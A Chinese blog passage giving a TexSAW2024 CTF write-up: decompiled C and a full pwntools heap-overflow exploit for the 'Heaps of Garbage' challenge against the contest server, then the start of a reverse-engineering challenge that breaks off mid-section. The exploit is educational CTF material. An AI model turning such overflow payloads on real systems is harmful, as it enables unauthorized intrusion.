<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="TexSAW2024 write up by 马嘉祺."><meta name="keywords" content="wp"><meta name="author" content="Alex"><meta name="copyright" content="Alex"><title>TexSAW2024 write up by 马嘉祺. | Alex's blog~</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Alex's blog~" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#re-pwn"><span class="toc-number">1.</span> <span class="toc-text">re&#x2F;pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Heaps-of-Garbage"><span class="toc-number">1.1.</span> <span class="toc-text">Heaps of Garbage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Collatz-eral-Damage"><span class="toc-number">1.2.</span> <span class="toc-text">Collatz-eral Damage</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics"><span class="toc-number">2.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Forked-Cave"><span class="toc-number">2.1.</span> <span class="toc-text">The Forked Cave</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MFMFT"><span class="toc-number">2.2.</span> <span class="toc-text">MFMFT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MalWhere"><span class="toc-number">2.3.</span> <span class="toc-text">MalWhere?</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cryptography"><span class="toc-number">3.</span> <span class="toc-text">Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ironcrypt"><span class="toc-number">3.1.</span> <span class="toc-text">Ironcrypt</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">4.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Login-Attempt"><span class="toc-number">4.1.</span> <span class="toc-text">Login Attempt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Out-of-Bounds"><span class="toc-number">4.2.</span> <span class="toc-text">Out of Bounds</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crazy-Cookie"><span class="toc-number">4.3.</span> <span class="toc-text">Crazy Cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extreme-Security"><span class="toc-number">4.4.</span> <span class="toc-text">Extreme Security</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Over-9000"><span class="toc-number">4.5.</span> <span class="toc-text">Over 9000</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Insecure-Social-Media-Login"><span class="toc-number">4.6.</span> <span class="toc-text">Insecure Social Media Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ask-and-It-Shall-Be-Given-to-You"><span class="toc-number">4.7.</span> <span class="toc-text">Ask, and It Shall Be Given to You</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://pic4.zhimg.com/80/v2-5cb1e2bdc0644f9828029a94181f4542_1440w.jpg"></div><div class="author-info__name text-center">Alex</div><div class="author-info__description text-center">pwn</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">33</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">31</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">1</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://n0vice.top/">N0vice</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://snowywar.top/">魔法少女雪殇</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://l0ne1y.xyz/">L0ne1y</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://eeeeeeeeeeeeeeeea.cn/">eeeeeeeeeeeeeeeea</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://giles-one.github.io/">cat03</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://ulrica66666.github.io/">ulrica66666</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Alex's blog~</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">TexSAW2024 write up by 马嘉祺.</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2024-03-25</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>我是TNT-马嘉祺，我为时代少年团代言。</p>
<p><img src="https://s2.loli.net/2024/03/25/iFg5eKNmnAz1YLC.png" alt="image-20240325110208104"></p>
<p>得分：</p>
<p><img src="https://s2.loli.net/2024/03/25/y7egPmsAzTliSFJ.png" alt="image-20240325110240315"></p>
<h1 id="re-pwn"><a href="#re-pwn" class="headerlink" title="re/pwn"></a>re/pwn</h1><h2 id="Heaps-of-Garbage"><a href="#Heaps-of-Garbage" class="headerlink" title="Heaps of Garbage"></a>Heaps of Garbage</h2><blockquote>
<p>You’ve decided to look for treasure in various piles of garbage in a junkyard at <code>nc 3.23.56.243 9010</code>. However, you must be careful: Some treasures contain lead, asbestos, or other poisonous materials, so make sure to avoid these treasures! Can  you dive through all the garbage heaps and collect all the salvageable  treasure while avoiding the toxic treasures?</p>
</blockquote>
<p>一个二进制文件，反编译如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *Glod_Bar__; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *Lead_Spo_; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *Asbestos_; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *Sludgeba_; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *The_Mona_; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v9; <span class="comment">// rsp</span></span><br><span class="line">  _BYTE v11[<span class="number">6</span>]; <span class="comment">// [rsp+8h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+Eh] [rbp-8Ah]</span></span><br><span class="line">  <span class="keyword">char</span> i; <span class="comment">// [rsp+Fh] [rbp-89h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> number; <span class="comment">// [rsp+10h] [rbp-88h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// [rsp+14h] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> *Gold_Bar_; <span class="comment">// [rsp+18h] [rbp-80h]</span></span><br><span class="line">  _BYTE *Lead_Spo; <span class="comment">// [rsp+20h] [rbp-78h]</span></span><br><span class="line">  _BYTE *Diamond; <span class="comment">// [rsp+28h] [rbp-70h]</span></span><br><span class="line">  _BYTE *Asbestos; <span class="comment">// [rsp+30h] [rbp-68h]</span></span><br><span class="line">  _BYTE *Sludgeba; <span class="comment">// [rsp+38h] [rbp-60h]</span></span><br><span class="line">  _BYTE *The_Mona; <span class="comment">// [rsp+40h] [rbp-58h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+48h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> *src; <span class="comment">// [rsp+50h] [rbp-48h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+58h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v25; <span class="comment">// [rsp+60h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v25 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  number = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter a number: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;number);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)number &lt;= <span class="number">0</span> )</span><br><span class="line">    number = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your number is: %d\n&quot;</span>, number);</span><br><span class="line">  Gold_Bar_ = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((<span class="keyword">int</span>)(<span class="number">0x20</span> * (number + <span class="number">2</span>)));</span><br><span class="line">  Lead_Spo = <span class="built_in">malloc</span>((<span class="keyword">int</span>)(<span class="number">32</span> * number));</span><br><span class="line">  Diamond = <span class="built_in">malloc</span>((<span class="keyword">int</span>)(<span class="number">32</span> * (number + <span class="number">3</span>)));</span><br><span class="line">  Asbestos = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  Sludgeba = <span class="built_in">malloc</span>((<span class="keyword">int</span>)(<span class="number">32</span> * (number + <span class="number">1</span>)));</span><br><span class="line">  The_Mona = <span class="built_in">malloc</span>((<span class="keyword">int</span>)(<span class="number">32</span> * (number + <span class="number">4</span>)));</span><br><span class="line">  Glod_Bar__ = Gold_Bar_;</span><br><span class="line">  *(_QWORD *)Gold_Bar_ = &#x27;raB_dloG&#x27;;            // Gold_Bar</span><br><span class="line">  Glod_Bar__[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  Lead_Spo_ = Lead_Spo;</span><br><span class="line">  *(_QWORD *)Lead_Spo = &#x27;opS_daeL&#x27;;             // Lead_Spo</span><br><span class="line">  <span class="built_in">strcpy</span>(Lead_Spo_ + <span class="number">8</span>, <span class="string">&quot;on&quot;</span>);</span><br><span class="line">  *(_QWORD *)Diamond = &#x27;dnomaiD&#x27;;               // Diamond</span><br><span class="line">  Asbestos_ = Asbestos;</span><br><span class="line">  *(_QWORD *)Asbestos = &#x27;sotsebsA&#x27;;             // Asbestos</span><br><span class="line">  <span class="built_in">strcpy</span>(Asbestos_ + <span class="number">8</span>, <span class="string">&quot;_Cloth&quot;</span>);</span><br><span class="line">  Sludgeba_ = Sludgeba;</span><br><span class="line">  *(_QWORD *)Sludgeba = &#x27;abegdulS&#x27;;             // Sludgeba</span><br><span class="line">  <span class="built_in">strcpy</span>(Sludgeba_ + <span class="number">8</span>, <span class="string">&quot;ll&quot;</span>);</span><br><span class="line">  The_Mona_ = The_Mona;</span><br><span class="line">  *(_QWORD *)The_Mona = &#x27;anoM_ehT&#x27;;             // The_Mona</span><br><span class="line">  <span class="built_in">strcpy</span>(The_Mona_ + <span class="number">8</span>, <span class="string">&quot;do&quot;</span>);</span><br><span class="line">  v15 = <span class="number">0x20</span> * (number + <span class="number">1</span> + number + number + <span class="number">2</span> + number + <span class="number">3</span> + <span class="number">1</span> + number + <span class="number">4</span>);</span><br><span class="line">  v22 = (<span class="keyword">int</span>)(v15 + <span class="number">80</span>) - <span class="number">1LL</span>;</span><br><span class="line">  v8 = <span class="number">0x10</span> * (((<span class="keyword">int</span>)(v15 + <span class="number">80</span>) + <span class="number">15LL</span>) / <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( v11 != &amp;v11[-(v8 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL)] )</span><br><span class="line">    ;</span><br><span class="line">  v9 = alloca(v8 &amp; <span class="number">0xFFF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (v8 &amp; <span class="number">0xFFF</span>) != <span class="number">0</span> )</span><br><span class="line">    *(_QWORD *)&amp;v11[(v8 &amp; <span class="number">0xFFF</span>) - <span class="number">8</span>] = *(_QWORD *)&amp;v11[(v8 &amp; <span class="number">0xFFF</span>) - <span class="number">8</span>];</span><br><span class="line">  src = v11;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your payload: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, src);</span><br><span class="line">  <span class="built_in">strcpy</span>(Gold_Bar_, src);</span><br><span class="line">  v12 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !Collected(Gold_Bar_) || !Collected(Diamond) || !Collected(The_Mona) )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Looks like you didn&#x27;t collect all the salvageable treasures&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !Lead_Spoon(Lead_Spo) || !Asbestos_Cloth(Asbestos) || !Sludgeball(Sludgeba) )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Looks like you ended up touching some of the poisonous treasure&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good job! You collected all the salvageable treasures while avoiding the poisonous ones! Here is your flag:&quot;</span>);</span><br><span class="line">    stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Cannot open file &quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = fgetc(stream); i != <span class="number">-1</span>; i = fgetc(stream) )</span><br><span class="line">      <span class="built_in">putchar</span>(i);</span><br><span class="line">    fclose(stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>堆布局：</p>
<p><img src="https://s2.loli.net/2024/03/24/DMQ8W1eAY5w6C4b.png" alt="image-20240324204702358"></p>
<p>大致就是申请了一堆chunk，然后满足每个chunk有特定的字符串就行，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./the_junkyard&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/2.34/lib/libc.so.6&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-hp&#x27;</span>, <span class="string">&#x27;65&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;3.23.56.243&quot;</span>, <span class="number">9010</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./the_junkyard&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&#x27;Enter a number:&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;Collected!&#x27;</span> + (<span class="number">0x60</span> - <span class="built_in">len</span>(<span class="string">&#x27;Collected!&#x27;</span>))  * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;c&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;Lead_Spoon&#x27;</span> + (<span class="number">0x20</span> - <span class="built_in">len</span>(<span class="string">&#x27;Lead_Spoon&#x27;</span>)) * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;c&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;Collected!&#x27;</span> + (<span class="number">0x80</span> - <span class="built_in">len</span>(<span class="string">&#x27;Collected!&#x27;</span>))  * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;c&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;Asbestos_Cloth&#x27;</span> + (<span class="number">0x20</span> - <span class="built_in">len</span>(<span class="string">&#x27;Asbestos_Cloth&#x27;</span>)) * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;c&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;Sludgeball&#x27;</span> + (<span class="number">0x40</span> - <span class="built_in">len</span>(<span class="string">&#x27;Sludgeball&#x27;</span>)) * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;c&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;Collected!&#x27;</span> + <span class="string">&#x27;hacked by TNT Jiaqi Ma!&#x27;</span></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<p>flag：</p>
<p><img src="https://s2.loli.net/2024/03/24/VomuOLPzgjskSAc.png" alt="image-20240324211715584"></p>
<h2 id="Collatz-eral-Damage"><a href="#Collatz-eral-Damage" class="headerlink" title="Collatz-eral Damage"></a>Collatz-eral Damage</h2><blockquote>
<p>Can you find the correct flag? It’s hidden somewhere in this binary.</p>
<p>Flag format: <code>texsaw&#123;&lt;some string&gt;&#125;</code></p>
</blockquote>
<p>主函数大致逻辑如下：输入flag，经过hailstone处理后，和一个密钥组对比。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4B4h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+10h] [rbp-4B0h]</span></span><br><span class="line">  <span class="keyword">int</span> v5[<span class="number">28</span>]; <span class="comment">// [rsp+20h] [rbp-4A0h]</span></span><br><span class="line">  <span class="keyword">int</span> v6[<span class="number">256</span>]; <span class="comment">// [rsp+90h] [rbp-430h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">40</span>]; <span class="comment">// [rsp+490h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+4B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s the flag? &quot;</span>);</span><br><span class="line">  fgets(flag, <span class="number">29</span>, _bss_start);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  qmemcpy(v6, &amp;dword_2060, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">28</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  shf(v6, <span class="number">256LL</span>, &amp;dword_2060);</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">186</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">79</span>;</span><br><span class="line">  v5[<span class="number">2</span>] = <span class="number">229</span>;</span><br><span class="line">  v5[<span class="number">3</span>] = <span class="number">160</span>;</span><br><span class="line">  v5[<span class="number">4</span>] = <span class="number">222</span>;</span><br><span class="line">  v5[<span class="number">5</span>] = <span class="number">172</span>;</span><br><span class="line">  v5[<span class="number">6</span>] = <span class="number">244</span>;</span><br><span class="line">  v5[<span class="number">7</span>] = <span class="number">94</span>;</span><br><span class="line">  v5[<span class="number">8</span>] = <span class="number">251</span>;</span><br><span class="line">  v5[<span class="number">9</span>] = <span class="number">4</span>;</span><br><span class="line">  v5[<span class="number">10</span>] = <span class="number">4</span>;</span><br><span class="line">  v5[<span class="number">11</span>] = <span class="number">222</span>;</span><br><span class="line">  v5[<span class="number">12</span>] = <span class="number">22</span>;</span><br><span class="line">  v5[<span class="number">13</span>] = <span class="number">80</span>;</span><br><span class="line">  v5[<span class="number">14</span>] = <span class="number">79</span>;</span><br><span class="line">  v5[<span class="number">15</span>] = <span class="number">96</span>;</span><br><span class="line">  v5[<span class="number">16</span>] = <span class="number">222</span>;</span><br><span class="line">  v5[<span class="number">17</span>] = <span class="number">4</span>;</span><br><span class="line">  v5[<span class="number">18</span>] = <span class="number">209</span>;</span><br><span class="line">  v5[<span class="number">19</span>] = <span class="number">78</span>;</span><br><span class="line">  v5[<span class="number">20</span>] = <span class="number">63</span>;</span><br><span class="line">  v5[<span class="number">21</span>] = <span class="number">13</span>;</span><br><span class="line">  v5[<span class="number">22</span>] = <span class="number">222</span>;</span><br><span class="line">  v5[<span class="number">23</span>] = <span class="number">58</span>;</span><br><span class="line">  v5[<span class="number">24</span>] = <span class="number">34</span>;</span><br><span class="line">  v5[<span class="number">25</span>] = <span class="number">33</span>;</span><br><span class="line">  v5[<span class="number">26</span>] = <span class="number">33</span>;</span><br><span class="line">  v5[<span class="number">27</span>] = <span class="number">103</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)hailstone((<span class="keyword">unsigned</span> <span class="keyword">int</span>)flag[i]) != v6[v5[i]] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Incorrect Value!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Correct Value!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关于密钥组的处理shf函数如下：</p>
